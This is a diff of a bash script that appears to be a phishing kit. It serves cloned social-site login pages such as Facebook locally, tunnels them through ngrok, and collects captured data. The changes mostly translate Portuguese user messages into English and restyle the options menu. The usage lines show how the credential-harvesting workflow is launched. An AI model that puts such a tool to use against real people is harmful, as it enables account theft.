@@ -70,19 +70,19 @@ verifySystemOs() {
     proot=$(ps -e | grep -Eo "proot")
 
     if [ -z "$proot" ] ; then
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mExecute este programa em uma shell proot\e[0m"
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mRun this program in a proot shell\e[0m"
 	interruptTwo
     fi
 }
 
 verifyLinks() {
     if [ "$1" == "null" -a "$2" == "null" ] ; then
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mLinks Ngrok nulos, execute este programa em outro tipo de shell proot ou execute este programa novamente\e[0m"
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mNull Ngrok links, run this program in another proot shell type or run this program again\e[0m"
     fi
 }
 
 interrupt() {
-    echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mPrograma interrompido\e[0m"
+    echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mInterrupted program\e[0m"
     processKill
     removeFiles
     stty -echoctl
@@ -131,7 +131,7 @@ copyFiles() {
 	cp -rf websites/${service}/* ./www
 
     else
-	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mEste serviço não está disponível\e[0m"
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis service is not available\e[0m"
 	exit 1
     fi
 }
@@ -143,7 +143,7 @@ tunnel() {
         showLinkNgrok
 
     else
-        echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mEste tunnel não está disponível\e[0m"
+	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mThis tunnel is not available\e[0m"
 	exit 1
     fi
 }
@@ -236,7 +236,7 @@ echo -e "\e[34m
 }
 
 helper() {
-    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-S, --services\tLista todos os serviços\n\t-T, --tunnels\tLista todos os tunels\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\n\t-t, --tunnel\tTunela a conexão localhost\n\t-i, \n\t--interactive\tInicia o programa em modo interativo\n\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
+    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tShow  this help screen and exit\n\t-v, --version\tShows the current version of the program\n\t-S, --services\tShow all services\n\t-T, --tunnels\tShow all tunnels\n\t-s, --service\tUse a service\n\t-l, --listen\tEnable listenning on localhost\n\t-t, --tunnel\tDefines a tunnel\n\t-i, \n\t--interactive\tStart the program in interactive mode\n\nExamples:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
     exit 0
 }
 
@@ -340,12 +340,6 @@ rerun() {
     fi
 }
 
-if [ -z "$1" ] ; then
-    banner
-    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mtente \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara ajuda\e[0m"
-    exit 1
-fi
-
 # Modo interativo
 menu() {
     while [ true ] ; do
@@ -384,7 +378,7 @@ menu() {
 	        list "${tunnels[*]}"
 
 	    elif [ "${REPLY:5}" == "options" ] ;then
-	        echo -e "\n\n\t\e[0m\e[34;2mSelected service \e[32;2m=> \e[0m\t[\e[31m$service\e[0m]\n\t\e[34;2mSelected tunnel \e[32;2m=> \e[0m\t[\e[31m$tunnel\e[0m]\n\n"
+	        echo -e "\e[0mModule options (service/${service:-No service}):\n\n\tName\tCurrent Setting\tRequire\tDescription\n\t----\t---------------\t-------\t-----------\n\tTunnel\t${tunnel:-ssh}\t\tno\tAllow the tunnel\n\n"
 
 	    else
 	        echo -e "\e[0m\e[33;1mCommands = services - tunnels - options ?\e[0m"
@@ -479,6 +473,13 @@ interactiveMode() {
     menu
 }
 
+if [ -z "$1" ] ; then
+    banner
+    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mError, try \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mfor more help\e[0m"
+    exit 0
+fi
+
+
 while [ -n "$1" ] ; do
     case "$1" in
 	-h | --help)
@@ -493,7 +494,7 @@ while [ -n "$1" ] ; do
 	    shift
 
 	    if [ -z "$1" ] ; then
-		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o serviço social\e[0m"
+		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mSpecify the service\e[0m"
 		exit 1
 	    fi
 
@@ -506,7 +507,7 @@ while [ -n "$1" ] ; do
 	    shift
 
 	    if [ -z "$1" ] ; then
-		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o tunnel\e[0m"
+		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mSpecify the tunnel\e[0m"
 		exit 1
 	    fi
 
@@ -517,7 +518,7 @@ while [ -n "$1" ] ; do
 	    interactiveMode;;
 
 	*)
-	    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mOpção inválida: \e[33;1m$1\e[0m" && exit 1;;
+	    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mInvalid option: \e[33;1m$1\e[0m" && exit 1;;
     esac
     shift
 done
@@ -529,6 +530,6 @@ elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
     banner && listen && tunnel && getDataCaptured
 
 else
-    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mErro ao processar o comando, tente: \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara mais detalhes\e[0m"
+    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mError processing command, try: \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mfor more details\e[0m"
     exit 1
 fi
